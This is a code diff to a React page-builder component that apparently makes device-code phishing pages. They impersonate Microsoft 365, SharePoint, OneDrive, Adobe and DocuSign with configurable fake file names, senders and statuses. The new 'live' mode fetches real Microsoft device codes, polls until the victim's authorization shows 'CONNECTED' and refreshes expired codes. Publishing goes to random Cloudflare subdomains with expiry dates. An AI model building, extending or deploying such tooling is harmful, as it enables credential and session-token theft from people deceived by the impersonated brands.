@@ -8,14 +8,14 @@ import {
 import Link from "next/link";
 import { useSearchParams } from "next/navigation";
 import QRCode from "qrcode";
-import { FormEvent, useCallback, useEffect, useMemo, useRef, useState } from "react";
+import { FormEvent, type MouseEvent, useCallback, useEffect, useMemo, useRef, useState } from "react";
 
 import { api } from "@/components/api";
 import { Drawer, Skeleton, StatusBadge, useToast } from "@/components/design-system";
 import { LogoLibrary, type BrandAsset, type LogoChoice } from "@/components/logo-library";
 import { buildPageDesign, defaultBuilderConfiguration, pageDesigns, providerProfiles, type PreviewState } from "@/lib/builder-designs";
-import { defaultProviderLogo, getBuiltinLogo } from "@/lib/logo-library";
 import { isSafeRedirectUrl, renderPageDocument, type BuilderConfiguration, type PageDocument } from "@/lib/page-document";
+import { providerAssets } from "@/lib/provider-assets";
 
 type Version = { id: string; version: number; document: PageDocument | null; html: string; css: string | null; javascript: string | null; state: string; editorId: string | null; createdAt: string };
 type Deployment = { id: string; hostname: string; status: string };
@@ -24,6 +24,8 @@ type Viewport = "desktop" | "tablet" | "mobile";
 type CloudflareStatus = { configured: boolean; credentialsSaved: boolean; authType: "API_TOKEN" | "GLOBAL_API_KEY" | null; accountId: string | null; accountName: string | null; zoneId: string | null; zoneName: string | null; baseDomain: string | null; credential: string };
 type Account = { id: string; name: string };
 type Zone = { id: string; name: string; status: string; account: { id: string; name: string } };
+type PreviewMode = "design" | "live";
+type LiveAuthorization = { sessionId: string; statusToken: string; userCode: string | null; verificationUri: string | null; expiresAt: string; status: string };
 
 const previewStates: Array<{ id: PreviewState; label: string }> = [
   { id: "initial", label: "Initial" }, { id: "waiting", label: "Waiting" },
@@ -36,11 +38,17 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
   const { notify } = useToast();
   const searchParams = useSearchParams();
   const loaded = useRef(false);
+  const liveStarting = useRef(false);
   const [project, setProject] = useState<Project | null>(null);
   const [brandAssets, setBrandAssets] = useState<BrandAsset[]>([]);
   const [configuration, setConfiguration] = useState<BuilderConfiguration>(defaultBuilderConfiguration());
   const [viewport, setViewport] = useState<Viewport>("desktop");
   const [previewState, setPreviewState] = useState<PreviewState>("waiting");
+  const [previewMode, setPreviewMode] = useState<PreviewMode>("design");
+  const [liveAuthorization, setLiveAuthorization] = useState<LiveAuthorization | null>(null);
+  const [liveLoading, setLiveLoading] = useState(false);
+  const [liveRemaining, setLiveRemaining] = useState("");
+  const [liveError, setLiveError] = useState("");
   const [dirty, setDirty] = useState(false);
   const [saving, setSaving] = useState(false);
   const [publishOpen, setPublishOpen] = useState(false);
@@ -75,28 +83,83 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
   useEffect(() => { void load(); }, [load]);
   useEffect(() => { if (searchParams.get("publish") === "true") setPublishOpen(true); }, [searchParams]);
 
-  const previewDocument = useMemo(() => buildPageDesign(configuration, previewState), [configuration, previewState]);
-  const rendered = useMemo(() => renderPageDocument(previewDocument, { deviceCode: "XXXX-XXXX", verificationUri: "https://microsoft.com/devicelogin", status: previewState, assetUrl: (id) => `/api/v1/brand-assets/${id}/content` }), [previewDocument, previewState]);
+  const liveState = mapLiveState(liveAuthorization?.status);
+  const activePreviewState = previewMode === "live" ? liveState : previewState;
+  const previewDocument = useMemo(() => buildPageDesign(configuration, activePreviewState), [configuration, activePreviewState]);
+  const rendered = useMemo(() => renderPageDocument(previewDocument, { deviceCode: previewMode === "live" ? liveAuthorization?.userCode ?? "Refreshing…" : "XXXX-XXXX", verificationUri: previewMode === "live" ? liveAuthorization?.verificationUri ?? "#" : "https://microsoft.com/devicelogin", status: activePreviewState, assetUrl: (id) => `/api/v1/brand-assets/${id}/content` }), [activePreviewState, liveAuthorization?.userCode, liveAuthorization?.verificationUri, previewDocument, previewMode]);
+  const orderedDesigns = useMemo(() => {
+    const recommended = providerAssets[configuration.provider].recommendedLayouts;
+    const rank = (id: BuilderConfiguration["layoutId"]) => { const index = recommended.indexOf(id); return index < 0 ? 99 : index; };
+    return [...pageDesigns].sort((a, b) => rank(a.id) - rank(b.id));
+  }, [configuration.provider]);
+
+  const startLivePreview = useCallback(async (replacementSessionId?: string) => {
+    if (liveStarting.current) return;
+    liveStarting.current = true; setLiveLoading(true); setLiveError("");
+    if (replacementSessionId) setLiveAuthorization((current) => current ? { ...current, userCode: null, status: "REFRESHING" } : current);
+    try {
+      const result = await api<{ statusToken: string; session?: Omit<LiveAuthorization, "statusToken"> }>("/microsoft/device/start", { method: "POST", body: JSON.stringify({ pageProjectId: projectId, replacementSessionId }) });
+      if (!result.session?.userCode) throw new Error("Microsoft did not return a device code");
+      setLiveAuthorization({ ...result.session, statusToken: result.statusToken });
+    } catch (error) {
+      setLiveError(error instanceof Error ? error.message : "Live authorization is unavailable");
+    } finally { liveStarting.current = false; setLiveLoading(false); }
+  }, [projectId]);
+
+  useEffect(() => {
+    if (previewMode === "live" && !liveAuthorization && !liveError) void startLivePreview();
+  }, [liveAuthorization, liveError, previewMode, startLivePreview]);
+  useEffect(() => {
+    if (previewMode !== "live" || !liveAuthorization || ["CONNECTED", "EXPIRED", "FAILED", "CANCELLED"].includes(liveAuthorization.status)) return;
+    const poll = window.setInterval(() => {
+      void api<{ authorization: { userCode: string | null; verificationUri: string | null; expiresAt: string; status: string } }>(`/microsoft/device/${liveAuthorization.sessionId}/status?token=${encodeURIComponent(liveAuthorization.statusToken)}`).then(({ authorization }) => {
+        setLiveError("");
+        setLiveAuthorization((current) => current ? { ...current, ...authorization } : current);
+      }).catch(() => setLiveError("Reconnecting to authorization status…"));
+    }, 3000);
+    return () => window.clearInterval(poll);
+  }, [liveAuthorization, previewMode]);
+  useEffect(() => {
+    if (previewMode !== "live" || !liveAuthorization) return;
+    const tick = () => {
+      const seconds = Math.max(0, Math.floor((new Date(liveAuthorization.expiresAt).getTime() - Date.now()) / 1000));
+      setLiveRemaining(`${Math.floor(seconds / 60)}:${String(seconds % 60).padStart(2, "0")}`);
+      if (seconds === 0 && liveAuthorization.status === "PENDING") void startLivePreview(liveAuthorization.sessionId);
+    };
+    tick(); const timer = window.setInterval(tick, 1000);
+    return () => window.clearInterval(timer);
+  }, [liveAuthorization, previewMode, startLivePreview]);
 
   function change(patch: Partial<BuilderConfiguration>) {
     setConfiguration((current) => ({ ...current, ...patch }));
     setDirty(true);
   }
   function changeProvider(provider: BuilderConfiguration["provider"]) {
-    const oldProfile = providerProfiles[configuration.provider];
-    const nextProfile = providerProfiles[provider];
+    const oldDefaults = defaultBuilderConfiguration(configuration.layoutId, configuration.provider);
+    const nextLayout = providerAssets[provider].defaultLayout;
+    const nextDefaults = defaultBuilderConfiguration(nextLayout, provider);
     change({
       provider,
-      primaryColor: nextProfile.color,
-      providerLogoId: defaultProviderLogo(provider, configuration.layoutId === "dark-professional"),
-      title: configuration.title === oldProfile.title ? nextProfile.title : configuration.title,
-      description: configuration.description === oldProfile.description ? nextProfile.description : configuration.description,
+      layoutId: nextLayout,
+      primaryColor: providerProfiles[provider].color,
+      background: providerAssets[provider].surface,
+      title: configuration.title === oldDefaults.title ? nextDefaults.title : configuration.title,
+      description: configuration.description === oldDefaults.description ? nextDefaults.description : configuration.description,
+      steps: configuration.steps.every((step, index) => step === oldDefaults.steps[index]) ? nextDefaults.steps : configuration.steps,
+      continueButtonText: configuration.continueButtonText === oldDefaults.continueButtonText ? nextDefaults.continueButtonText : configuration.continueButtonText,
+      footer: configuration.footer === oldDefaults.footer ? nextDefaults.footer : configuration.footer,
+      successMessage: configuration.successMessage === oldDefaults.successMessage ? nextDefaults.successMessage : configuration.successMessage,
+      documentName: configuration.documentName === oldDefaults.documentName ? nextDefaults.documentName : configuration.documentName,
+      documentTitle: configuration.documentTitle === oldDefaults.documentTitle ? nextDefaults.documentTitle : configuration.documentTitle,
+      fileType: configuration.fileType === oldDefaults.fileType ? nextDefaults.fileType : configuration.fileType,
+      fileSize: configuration.fileSize === oldDefaults.fileSize ? nextDefaults.fileSize : configuration.fileSize,
+      pageCount: configuration.pageCount === oldDefaults.pageCount ? nextDefaults.pageCount : configuration.pageCount,
+      documentStatus: configuration.documentStatus === oldDefaults.documentStatus ? nextDefaults.documentStatus : configuration.documentStatus,
+      sender: configuration.sender === oldDefaults.sender ? nextDefaults.sender : configuration.sender,
     });
   }
   function changeLayout(layoutId: BuilderConfiguration["layoutId"]) {
-    const design = pageDesigns.find((item) => item.id === layoutId)!;
-    const dark = layoutId === "dark-professional";
-    change({ layoutId, primaryColor: design.accent, background: dark ? "#08131f" : "#f5f6f8", providerLogoId: defaultProviderLogo(configuration.provider, dark) });
+    change({ layoutId, primaryColor: providerAssets[configuration.provider].accent, background: providerAssets[configuration.provider].surface });
   }
   async function save(quiet = false, state: "DRAFT" | "PUBLISHED" = "DRAFT") {
     if (saving) return false;
@@ -129,38 +192,34 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
 
   function selectLogo(choice: LogoChoice) {
     if (choice.kind === "custom") {
-      change({ companyLogoAssetId: choice.asset.id, logoMode: configuration.logoMode === "provider" ? "both" : "company" });
-      return;
+      change({ companyLogoAssetId: choice.asset.id, logoMode: "both" });
     }
-    if (logoLibrarySlot === "company") {
-      change({ companyBuiltinLogoId: choice.logo.id, companyLogoAssetId: undefined, logoMode: configuration.logoMode === "provider" ? "both" : "company" });
-      return;
-    }
-    if (logoLibrarySlot === "provider") changeProvider(choice.logo.provider);
-    change({ providerLogoId: choice.logo.id, logoMode: configuration.logoMode === "company" ? "both" : "provider" });
+  }
+  function handlePreviewClick(event: MouseEvent<HTMLDivElement>) {
+    const target = (event.target as HTMLElement).closest<HTMLElement>("[data-action]");
+    if (!target) return;
+    event.preventDefault();
+    if (target.dataset.action === "copy-device-code" && previewMode === "live" && liveAuthorization?.userCode) void navigator.clipboard.writeText(liveAuthorization.userCode);
+    if (target.dataset.action === "open-microsoft" && previewMode === "live" && liveAuthorization?.verificationUri) window.open(liveAuthorization.verificationUri, "_blank", "noopener,noreferrer");
   }
 
   if (!project) return <section className="panel panel-body"><Skeleton lines={12} /></section>;
   return <div className="focused-builder">
     <header className="focused-builder-topbar">
-      <div className="builder-project-title"><Link href="/admin/html-projects">HTML Pages</Link><span>/</span><strong>{project.name}</strong><StatusBadge status={saving ? "Saving" : dirty ? "Unsaved" : "Saved"} /></div>
-      <div className="builder-top-actions"><button className="secondary" onClick={() => setHistoryOpen(true)}><History size={15} />History</button><button className="secondary" disabled={saving} onClick={() => void save()}><Save size={15} />{saving ? "Saving…" : "Save"}</button><button onClick={() => setPublishOpen(true)}><Send size={15} />Publish</button></div>
+      <div className="builder-project-title"><Link href="/admin/html-projects">HTML Pages</Link><span>/</span><strong>{project.name}</strong></div>
+      <div className="builder-top-actions"><span className={`builder-save-state ${dirty || saving ? "saving" : "saved"}`} aria-live="polite"><i />{dirty || saving ? "Saving…" : "Saved"}</span><button className="secondary" onClick={() => setHistoryOpen(true)}><History size={15} />History</button><button className="secondary" disabled={saving} onClick={() => void save()}><Save size={15} />{saving ? "Saving…" : "Save"}</button><button onClick={() => setPublishOpen(true)}><Send size={15} />Publish</button></div>
     </header>
     <div className="focused-builder-grid">
       <aside className="builder-controls">
-        <section className="builder-control-section"><div className="control-heading"><strong>Design</strong><small>Updates the live page immediately</small></div><label>Provider<select value={configuration.provider} onChange={(event) => changeProvider(event.target.value as BuilderConfiguration["provider"])}>{Object.entries(providerProfiles).map(([id, provider]) => <option value={id} key={id}>{provider.name}</option>)}</select></label><div className="inline-design-grid">{pageDesigns.map((design) => <button className={configuration.layoutId === design.id ? "selected" : ""} onClick={() => changeLayout(design.id)} key={design.id}><DesignThumbnail configuration={{ ...configuration, layoutId: design.id }} /><span>{design.name}</span></button>)}</div></section>
-        <details open><summary>Branding <ChevronDown size={14} /></summary><div>
-          <label>Logo display<select value={configuration.logoMode} onChange={(event) => change({ logoMode: event.target.value as BuilderConfiguration["logoMode"] })}><option value="both">Both</option><option value="provider">Provider only</option><option value="company">Company only</option><option value="none">None</option></select></label>
-          <div className="selected-logo-row"><button onClick={() => setLogoLibrarySlot("provider")}><SelectedProviderLogo id={configuration.providerLogoId} /><span><small>Provider logo</small><strong>Browse logos</strong></span></button><button onClick={() => setLogoLibrarySlot("company")}><SelectedCompanyLogo asset={brandAssets.find((asset) => asset.id === configuration.companyLogoAssetId)} builtinId={configuration.companyBuiltinLogoId} /><span><small>Company logo</small><strong>{configuration.companyLogoAssetId ? "Change logo" : "Choose logo"}</strong></span></button></div>
+        <section className="builder-control-section"><div className="control-heading"><strong>Page</strong><small>Provider styling and layout recommendations are automatic</small></div><label>Provider<select value={configuration.provider === "custom" ? "company" : configuration.provider} onChange={(event) => changeProvider(event.target.value as BuilderConfiguration["provider"])}>{(["microsoft365", "sharepoint", "onedrive", "adobe", "docusign", "company"] as const).map((id) => <option value={id} key={id}>{providerProfiles[id].name}</option>)}</select></label><label>File or resource<input value={configuration.documentName} onChange={(event) => change({ documentName: event.target.value })} /></label><label>Status<input value={configuration.documentStatus} onChange={(event) => change({ documentStatus: event.target.value })} /></label><div className="theme-color-control"><label>Theme color<div><input type="color" value={configuration.primaryColor} onChange={(event) => change({ primaryColor: event.target.value })} /><output>{configuration.primaryColor.toUpperCase()}</output></div><input aria-label="Theme hue" className="hue-dragger" type="range" min="0" max="359" value={hexHue(configuration.primaryColor)} onChange={(event) => change({ primaryColor: hueHex(Number(event.target.value)) })} /></label><button className="secondary button-sm" onClick={() => change({ primaryColor: providerAssets[configuration.provider].accent })}><RefreshCw size={13} />Provider default</button></div></section>
+        <details><summary>Company branding <ChevronDown size={14} /></summary><div>
+          <label>Company logo<select value={configuration.logoMode === "both" || configuration.logoMode === "company" ? "both" : "provider"} onChange={(event) => change({ logoMode: event.target.value as "provider" | "both" })}><option value="provider">Not shown</option><option value="both">Show with provider identity</option></select></label>
+          <div className="selected-logo-row one"><button onClick={() => setLogoLibrarySlot("company")}><SelectedCompanyLogo asset={brandAssets.find((asset) => asset.id === configuration.companyLogoAssetId)} /><span><small>Optional company logo</small><strong>{configuration.companyLogoAssetId ? "Change logo" : "Choose logo"}</strong></span></button></div>
           <Link className="brand-library-link" href="/admin/settings/brand-assets">Manage company brand library</Link>
           <div className="compact-control-grid"><label>Size<select value={configuration.logoSize} onChange={(event) => change({ logoSize: event.target.value as BuilderConfiguration["logoSize"] })}><option value="small">Small</option><option value="medium">Medium</option><option value="large">Large</option></select></label><label>Position<select value={configuration.logoAlignment} onChange={(event) => change({ logoAlignment: event.target.value as BuilderConfiguration["logoAlignment"] })}><option value="left">Left</option><option value="center">Center</option><option value="right">Right</option></select></label></div>
-          <label>Logo width · {configuration.logoWidth}px<input type="range" min="80" max="280" value={configuration.logoWidth} onChange={(event) => change({ logoWidth: Number(event.target.value) })} /></label>
-          <label className="toggle-row"><input type="checkbox" checked={configuration.showProviderName ?? true} onChange={(event) => change({ showProviderName: event.target.checked })} />Show provider name</label>
-          <div className="theme-color-control"><label>Theme color<div><input type="color" value={configuration.primaryColor} onChange={(event) => change({ primaryColor: event.target.value })} /><output>{configuration.primaryColor.toUpperCase()}</output></div><input aria-label="Theme hue" className="hue-dragger" type="range" min="0" max="359" value={hexHue(configuration.primaryColor)} onChange={(event) => change({ primaryColor: hueHex(Number(event.target.value)) })} /></label><button className="secondary button-sm" onClick={() => change({ primaryColor: pageDesigns.find((design) => design.id === configuration.layoutId)!.accent })}><RefreshCw size={13} />Reset color</button></div>
+          <label>Logo width · {configuration.logoWidth}px<input type="range" min="80" max="200" value={configuration.logoWidth} onChange={(event) => change({ logoWidth: Number(event.target.value) })} /></label>
         </div></details>
         <details open><summary>Content <ChevronDown size={14} /></summary><div>
-          <label>Title<input value={configuration.title} maxLength={200} onChange={(event) => change({ title: event.target.value })} /></label>
-          <label>Description<textarea rows={3} value={configuration.description} onChange={(event) => change({ description: event.target.value })} /></label>
           {configuration.steps.map((step, index) => <label key={index}>Step {index + 1}<input value={step} onChange={(event) => { const steps = [...configuration.steps] as BuilderConfiguration["steps"]; steps[index] = event.target.value; change({ steps }); }} /></label>)}
           <label>Continue button<input value={configuration.continueButtonText} onChange={(event) => change({ continueButtonText: event.target.value })} /></label>
           <label>Footer<input value={configuration.footer} onChange={(event) => change({ footer: event.target.value })} /></label>
@@ -174,20 +233,19 @@ export function HtmlEditor({ projectId }: { projectId: string }) {
         <details open><summary>Behavior <ChevronDown size={14} /></summary><div><label>Redirect URL<input type="url" placeholder="https://company.example/complete" value={configuration.redirectUrl ?? ""} onChange={(event) => change({ redirectUrl: event.target.value })} /></label><label>Redirect label<input value={configuration.redirectText} onChange={(event) => change({ redirectText: event.target.value })} /></label><label>Redirect delay<select value={configuration.redirectDelay} onChange={(event) => change({ redirectDelay: event.target.value as BuilderConfiguration["redirectDelay"] })}><option value="immediate">Immediately</option><option value="1">1 second</option><option value="3">3 seconds</option><option value="5">5 seconds</option><option value="10">10 seconds</option><option value="never">Do not redirect</option></select></label></div></details>
         <details><summary>Deployment & advanced <ChevronDown size={14} /></summary><div><button onClick={() => setPublishOpen(true)}><Cloud size={14} />Cloudflare publish settings</button><button className="secondary" onClick={() => setAdvancedOpen(true)}><Code2 size={14} />Advanced code</button></div></details>
       </aside>
-      <main className="preview-stage">
-        <div className="preview-stage-toolbar"><span><i />Live preview · every change is immediate</span><div className="builder-device-switcher"><button className={viewport === "desktop" ? "active" : ""} onClick={() => setViewport("desktop")} title="Desktop"><Monitor size={16} /></button><button className={viewport === "tablet" ? "active" : ""} onClick={() => setViewport("tablet")} title="Tablet"><Laptop size={16} /></button><button className={viewport === "mobile" ? "active" : ""} onClick={() => setViewport("mobile")} title="Mobile"><Smartphone size={16} /></button></div><label className="preview-state-control">State<select value={previewState} onChange={(event) => setPreviewState(event.target.value as PreviewState)}>{previewStates.slice(0, 5).map((state) => <option value={state.id} key={state.id}>{state.label}</option>)}</select></label><span>{viewport === "desktop" ? "1440" : viewport === "tablet" ? "768" : "390"} px</span></div>
-        <div className={`focused-preview preview-${viewport}`}><style>{rendered.css}</style><div className="direct-page-preview" onClick={(event) => event.preventDefault()} dangerouslySetInnerHTML={{ __html: rendered.html }} /></div>
+      <main className="builder-preview-column">
+        <section className="preview-stage"><div className="preview-stage-toolbar"><span><i />{previewMode === "live" ? "Live authorization preview" : "Design preview"}</span><div className="segmented preview-mode-switch"><button className={previewMode === "design" ? "active" : ""} onClick={() => setPreviewMode("design")}>Design</button><button className={previewMode === "live" ? "active" : ""} onClick={() => { setLiveError(""); setPreviewMode("live"); }}>Live</button></div><div className="builder-device-switcher"><button className={viewport === "desktop" ? "active" : ""} onClick={() => setViewport("desktop")} title="Desktop"><Monitor size={16} /></button><button className={viewport === "tablet" ? "active" : ""} onClick={() => setViewport("tablet")} title="Tablet"><Laptop size={16} /></button><button className={viewport === "mobile" ? "active" : ""} onClick={() => setViewport("mobile")} title="Mobile"><Smartphone size={16} /></button></div>{previewMode === "design" ? <label className="preview-state-control">State<select value={previewState} onChange={(event) => setPreviewState(event.target.value as PreviewState)}>{previewStates.slice(0, 5).map((state) => <option value={state.id} key={state.id}>{state.label}</option>)}</select></label> : <span className="live-session-state">{liveLoading ? "Starting…" : liveAuthorization ? `${friendlyStatus(liveAuthorization.status)} · ${liveRemaining}` : "Not started"}</span>}</div>{liveError && <div className="live-preview-error">{liveError}<button className="secondary button-sm" onClick={() => { setLiveError(""); void startLivePreview(liveAuthorization?.sessionId); }}>Retry</button></div>}<div className={`focused-preview preview-${viewport}`}><style>{rendered.css}</style><div className="direct-page-preview" onClick={handlePreviewClick} dangerouslySetInnerHTML={{ __html: rendered.html }} /></div></section>
+        <section className="design-carousel"><div><strong>Choose another design</strong><small>Recommended first for {providerProfiles[configuration.provider].name}</small></div><div className="design-carousel-track">{orderedDesigns.map((design) => <button className={configuration.layoutId === design.id ? "selected" : ""} onClick={() => changeLayout(design.id)} key={design.id}><DesignThumbnail configuration={{ ...configuration, layoutId: design.id }} /><span>{design.name}</span>{configuration.layoutId === design.id && <Check size={12} />}</button>)}</div></section>
       </main>
     </div>
-    <LogoLibrary open={Boolean(logoLibrarySlot)} slot={logoLibrarySlot ?? "provider"} assets={brandAssets} onAssetsChange={setBrandAssets} onClose={() => setLogoLibrarySlot(null)} onSelect={selectLogo} />
+    <LogoLibrary open={Boolean(logoLibrarySlot)} assets={brandAssets} onAssetsChange={setBrandAssets} onClose={() => setLogoLibrarySlot(null)} onSelect={selectLogo} />
     <Drawer open={advancedOpen} title="Advanced code" onClose={() => setAdvancedOpen(false)}><div className="stack"><div className="security-warning"><strong>Advanced users only.</strong> Custom JavaScript is intentionally unavailable in published pages.</div><label>Additional HTML<textarea rows={12} value={customHtml} onChange={(event) => { setCustomHtml(event.target.value); setDirty(true); }} /></label><label>Additional CSS<textarea rows={14} value={customCss} onChange={(event) => { setCustomCss(event.target.value); setDirty(true); }} /></label></div></Drawer>
     <Drawer open={historyOpen} title="Version history" onClose={() => setHistoryOpen(false)}><div className="version-history">{project.versions.map((version) => <article key={version.id}><div><strong>Version {version.version}</strong><StatusBadge status={version.state} /><p>{new Date(version.createdAt).toLocaleString()}</p></div>{version.document?.settings.builder && <button className="secondary button-sm" onClick={() => { setConfiguration(version.document!.settings.builder!); setDirty(true); setHistoryOpen(false); }}>Restore</button>}</article>)}</div></Drawer>
     <PublishDrawer open={publishOpen} project={project} configuration={configuration} onClose={() => setPublishOpen(false)} onSave={() => save(true, "PUBLISHED")} />
   </div>;
 }
 
-function SelectedProviderLogo({ id }: { id?: string }) { const logo = getBuiltinLogo(id); return logo ? <img src={logo.src} alt="" /> : <ImageIcon size={24} />; }
-function SelectedCompanyLogo({ asset, builtinId }: { asset?: BrandAsset; builtinId?: string }) { const logo = getBuiltinLogo(builtinId); return asset ? <img src={asset.url} alt="" /> : logo ? <img src={logo.src} alt="" /> : <ImageIcon size={24} />; }
+function SelectedCompanyLogo({ asset }: { asset?: BrandAsset }) { return asset ? <img src={asset.url} alt="" /> : <ImageIcon size={24} />; }
 
 function DesignThumbnail({ configuration }: { configuration: BuilderConfiguration }) {
   const document = buildPageDesign(configuration, "waiting");
@@ -254,17 +312,8 @@ function PublishDrawer({ open, project, configuration, onClose, onSave }: { open
     finally { setPublishing(false); }
   }
   async function startMicrosoftSession() {
-    const popup = window.open("", "_blank");
-    try {
-      const response = await api<{ connectUrl: string; publishedConnectUrl?: string; bridgeError?: string }>("/microsoft/device/start", { method: "POST", body: JSON.stringify({ pageProjectId: project.id, deploymentId: result?.id }) });
-      const destination = response.publishedConnectUrl ?? response.connectUrl;
-      if (popup) popup.location.href = destination;
-      else window.location.href = destination;
-      if (response.bridgeError) notify({ title: "Opened secure local connection page", message: response.bridgeError, tone: "info" });
-    } catch (error) {
-      popup?.close();
-      notify({ title: "Microsoft session could not start", message: error instanceof Error ? error.message : undefined, tone: "error" });
-    }
+    if (!result) return;
+    window.open(`https://${result.hostname}`, "_blank", "noopener,noreferrer");
   }
   return <Drawer open={open} title={result ? "Deployment successful" : "Publish & deploy"} onClose={onClose}>
     {result ? <div className="deployment-success"><span className="success-check"><Check size={28} /></span><div><div className="eyebrow">Deployment successful</div><h2>Your page is live</h2><p className="muted">The wildcard Cloudflare router is serving the latest published version.</p></div><div className="published-url"><Cloud size={18} /><span><small>Live URL</small><strong>https://{result.hostname}</strong></span><button className="icon-button" onClick={() => void navigator.clipboard.writeText(`https://${result.hostname}`)}><Copy size={15} /></button></div>{result.qr && <img className="deployment-qr" src={result.qr} alt={`QR code for https://${result.hostname}`} />}{result.accessCode && <div className="access-code-result"><small>Copy this access code now</small><strong>{result.accessCode}</strong></div>}<div className="deployment-success-actions"><button onClick={() => window.open(`https://${result.hostname}`, "_blank", "noopener,noreferrer")}><ExternalLink size={15} />Open page</button><button className="secondary" onClick={() => void startMicrosoftSession()}><ExternalLink size={15} />Start Microsoft session</button><button className="secondary" onClick={() => void navigator.clipboard.writeText(`https://${result.hostname}`)}><Copy size={15} />Copy link</button><button className="secondary" onClick={() => setResult(null)}><RefreshCw size={15} />Republish</button><button className="secondary" onClick={onClose}>Edit page</button></div></div> :
@@ -282,6 +331,8 @@ function PublishDrawer({ open, project, configuration, onClose, onSave }: { open
 function normalizeLayout(value: string): BuilderConfiguration["layoutId"] { return pageDesigns.some((design) => design.id === value) ? value as BuilderConfiguration["layoutId"] : "compact-card"; }
 function randomLabel() { const alphabet = "abcdefghjkmnpqrstuvwxyz23456789"; const bytes = crypto.getRandomValues(new Uint8Array(7)); return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join(""); }
 function expirationDate(value: string, custom: string) { const now = Date.now(); if (value === "1h") return new Date(now + 3_600_000).toISOString(); if (value === "24h") return new Date(now + 86_400_000).toISOString(); if (value === "7d") return new Date(now + 7 * 86_400_000).toISOString(); if (value === "custom" && custom) return new Date(custom).toISOString(); return undefined; }
+function mapLiveState(status?: string): PreviewState { return status === "CONNECTED" ? "success" : status === "EXPIRED" ? "expired" : status === "FAILED" || status === "CANCELLED" ? "error" : "waiting"; }
+function friendlyStatus(status: string) { return ({ PENDING: "Waiting for authorization", CONNECTED: "Authorized", EXPIRED: "Expired", FAILED: "Failed", CANCELLED: "Cancelled", REFRESHING: "Refreshing code" } as Record<string, string>)[status] ?? status; }
 function hexHue(value: string) {
   const number = Number.parseInt(value.replace("#", ""), 16);
   const r = ((number >> 16) & 255) / 255, g = ((number >> 8) & 255) / 255, b = (number & 255) / 255;
